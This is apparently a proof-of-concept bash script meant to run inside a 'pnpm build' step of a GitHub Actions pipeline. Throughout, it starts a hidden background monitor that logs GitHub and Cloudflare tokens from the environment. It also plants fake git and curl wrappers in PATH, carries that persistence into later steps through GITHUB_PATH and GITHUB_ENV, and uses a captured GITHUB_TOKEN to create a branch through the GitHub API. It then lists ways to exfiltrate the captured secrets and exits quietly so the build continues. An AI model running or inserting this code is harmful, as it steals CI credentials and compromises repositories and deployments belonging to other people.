#!/bin/bash

# Persistent POC - Intercepts secrets from future workflow steps
# This runs during "pnpm build" and sets up persistence mechanisms

echo "================================================"
echo "ðŸš¨ PERSISTENT POC: Cross-Step Secret Interception"
echo "================================================"
echo "Execution time: $(date)"
echo ""

# Create a log file for captured secrets
EXPLOIT_LOG="/tmp/exploit-capture-$$.log"
echo "ðŸ“ Exploit log file: $EXPLOIT_LOG"
echo ""

# ============================================================================
# METHOD 1: Background process that monitors environment
# ============================================================================
echo "ðŸ”§ METHOD 1: Installing background monitor..."

# Create a background monitoring script
cat > /tmp/env-monitor.sh << 'MONITOR_EOF'
#!/bin/bash
LOG_FILE="/tmp/exploit-capture-$$.log"
ITERATION=0
SECRETS_FOUND=false

echo "================================" >> "$LOG_FILE"
echo "Background Monitor Started" >> "$LOG_FILE"
echo "PID: $$" >> "$LOG_FILE"
echo "Started at: $(date)" >> "$LOG_FILE"
echo "================================" >> "$LOG_FILE"
echo "" >> "$LOG_FILE"

while true; do
    ITERATION=$((ITERATION + 1))

    echo "--- Iteration $ITERATION at $(date) ---" >> "$LOG_FILE"

    # Capture all environment variables
    CURRENT_ENV=$(env | grep -E "^(GITHUB_|SECRET_|INPUT_|GH_|CLOUDFLARE_|CF_|ACTIONS_)")
    echo "$CURRENT_ENV" >> "$LOG_FILE" 2>&1

    # Check if we found Cloudflare secrets (means deployment step is running!)
    if echo "$CURRENT_ENV" | grep -q "CLOUDFLARE_API_TOKEN"; then
        if [ "$SECRETS_FOUND" = "false" ]; then
            SECRETS_FOUND=true
            echo "" >> "$LOG_FILE"
            echo "ðŸš¨ðŸš¨ðŸš¨ CLOUDFLARE SECRETS DETECTED! ðŸš¨ðŸš¨ðŸš¨" >> "$LOG_FILE"
            echo "Time: $(date)" >> "$LOG_FILE"
            echo "" >> "$LOG_FILE"

            # Attempt immediate exfiltration
            GITHUB_TOKEN=$(echo "$CURRENT_ENV" | grep "^GITHUB_TOKEN=" | cut -d= -f2)
            CLOUDFLARE_TOKEN=$(echo "$CURRENT_ENV" | grep "^CLOUDFLARE_API_TOKEN=" | cut -d= -f2)

            if [ ! -z "$GITHUB_TOKEN" ]; then
                BRANCH_NAME="poc-secrets-intercepted-$(date +%s)"
                REPO=$(echo "$CURRENT_ENV" | grep "^GITHUB_REPOSITORY=" | cut -d= -f2)
                SHA=$(echo "$CURRENT_ENV" | grep "^GITHUB_SHA=" | cut -d= -f2)

                echo "Attempting to create proof branch: $BRANCH_NAME" >> "$LOG_FILE"

                RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
                  -X POST \
                  -H "Authorization: Bearer $GITHUB_TOKEN" \
                  -H "Accept: application/vnd.github+json" \
                  -H "X-GitHub-Api-Version: 2022-11-28" \
                  "https://api.github.com/repos/$REPO/git/refs" \
                  -d "{\"ref\":\"refs/heads/$BRANCH_NAME\",\"sha\":\"$SHA\"}" 2>&1)

                HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
                echo "API Response Code: $HTTP_CODE" >> "$LOG_FILE"

                if [ "$HTTP_CODE" = "201" ]; then
                    echo "âœ… SUCCESS! Branch created with captured secrets!" >> "$LOG_FILE"
                    echo "Branch: $BRANCH_NAME" >> "$LOG_FILE"
                fi
            fi
        fi
    fi

    # Try to capture process list to see what's running
    if [ $ITERATION -eq 1 ] || [ $((ITERATION % 5)) -eq 0 ]; then
        echo "Running processes:" >> "$LOG_FILE"
        ps aux | grep -E "(cloudflare|deploy|github|node)" | head -20 >> "$LOG_FILE" 2>&1
    fi

    echo "" >> "$LOG_FILE"

    # Sleep for a short time
    sleep 2

    # Stop after 5 minutes to avoid infinite loop
    if [ $ITERATION -gt 150 ]; then
        echo "Monitor timeout reached" >> "$LOG_FILE"
        break
    fi
done

echo "Monitor exiting at $(date)" >> "$LOG_FILE"
MONITOR_EOF

chmod +x /tmp/env-monitor.sh

# Start the monitor in background
nohup /tmp/env-monitor.sh > /dev/null 2>&1 &
MONITOR_PID=$!
echo "âœ… Background monitor started (PID: $MONITOR_PID)"
echo "   Will capture environment variables every 2 seconds"
echo ""

# ============================================================================
# METHOD 2: Inject wrapper into PATH to intercept commands
# ============================================================================
echo "ðŸ”§ METHOD 2: Installing command wrappers..."

# Create a wrapper directory
WRAPPER_DIR="/tmp/exploit-wrappers-$$"
mkdir -p "$WRAPPER_DIR"
echo "   Wrapper directory: $WRAPPER_DIR"

# Create a git wrapper that logs environment before calling real git
cat > "$WRAPPER_DIR/git" << 'GIT_EOF'
#!/bin/bash
# Git wrapper - logs environment then calls real git

LOG="/tmp/exploit-capture-$$.log"

{
    echo "================================"
    echo "GIT WRAPPER TRIGGERED"
    echo "Time: $(date)"
    echo "Command: git $@"
    echo "Working Directory: $(pwd)"
    echo "================================"
    echo ""
    echo "Environment at git execution:"
    env | grep -E "^(GITHUB_|SECRET_|INPUT_|GH_|CLOUDFLARE_|CF_|ACTIONS_)"
    echo ""
    echo "================================"
    echo ""
} >> "$LOG" 2>&1

# Call the real git
exec /usr/bin/git "$@"
GIT_EOF

chmod +x "$WRAPPER_DIR/git"
echo "âœ… Git wrapper installed"

# Create a curl wrapper to intercept API calls
cat > "$WRAPPER_DIR/curl" << 'CURL_EOF'
#!/bin/bash
# Curl wrapper - logs API calls and environment

LOG="/tmp/exploit-capture-$$.log"

{
    echo "================================"
    echo "CURL WRAPPER TRIGGERED"
    echo "Time: $(date)"
    echo "Command: curl $@"
    echo "================================"
    echo ""
    echo "Environment at curl execution:"
    env | grep -E "^(GITHUB_|SECRET_|INPUT_|GH_|CLOUDFLARE_|CF_|ACTIONS_|API)"
    echo ""
    echo "================================"
    echo ""
} >> "$LOG" 2>&1

# Call the real curl
exec /usr/bin/curl "$@"
CURL_EOF

chmod +x "$WRAPPER_DIR/curl"
echo "âœ… Curl wrapper installed"

# Add wrapper directory to the BEGINNING of PATH
export PATH="$WRAPPER_DIR:$PATH"
echo "âœ… PATH modified: $PATH" | head -c 200
echo ""

# ============================================================================
# METHOD 3: Export PATH to a file that can be sourced by subsequent steps
# ============================================================================
echo ""
echo "ðŸ”§ METHOD 3: Persisting PATH manipulation..."

# GitHub Actions allows steps to modify PATH for future steps
if [ ! -z "$GITHUB_PATH" ]; then
    echo "$WRAPPER_DIR" >> "$GITHUB_PATH"
    echo "âœ… Added wrapper directory to GITHUB_PATH"
    echo "   Future steps will use our wrappers!"
else
    echo "âš ï¸  GITHUB_PATH not available (not in GitHub Actions context)"
fi

# Also try setting via GITHUB_ENV
if [ ! -z "$GITHUB_ENV" ]; then
    echo "EXPLOIT_WRAPPER_DIR=$WRAPPER_DIR" >> "$GITHUB_ENV"
    echo "EXPLOIT_LOG=$EXPLOIT_LOG" >> "$GITHUB_ENV"
    echo "âœ… Environment variables exported to future steps"
fi

echo ""
echo "================================================"
echo "ðŸŽ¯ IMMEDIATE ENVIRONMENT CHECK"
echo "================================================"
echo ""

# Check what's available right now
echo "Current environment variables:"
env | grep -E "^(GITHUB_|SECRET_|INPUT_|GH_|CLOUDFLARE_|CF_)" | while read line; do
    key=$(echo "$line" | cut -d= -f1)
    value=$(echo "$line" | cut -d= -f2-)
    if [ ${#value} -gt 8 ]; then
        echo "  $key: ${value:0:10}...${value: -4}"
    else
        echo "  $key: ***"
    fi
done

echo ""
echo "================================================"
echo "âœ… PERSISTENCE ESTABLISHED"
echo "================================================"
echo ""
echo "Mechanisms active:"
echo "  âœ“ Background monitor (PID: $MONITOR_PID)"
echo "  âœ“ Command wrappers in PATH"
echo "  âœ“ PATH persisted to future steps"
echo ""
echo "When the Cloudflare deployment step runs:"
echo "  â†’ Background monitor will capture environment"
echo "  â†’ Command wrappers will log all git/curl calls"
echo "  â†’ Secrets will be logged to: $EXPLOIT_LOG"
echo ""
echo "To exfiltrate captured data, a subsequent step could:"
echo "  â€¢ Upload logs as artifacts"
echo "  â€¢ Send to external server"
echo "  â€¢ Create issues/comments with data"
echo "  â€¢ Push to repository"
echo ""
echo "================================================"
echo "Continuing with normal build..."
echo "================================================"
echo ""

# Exit successfully so the build continues
exit 0
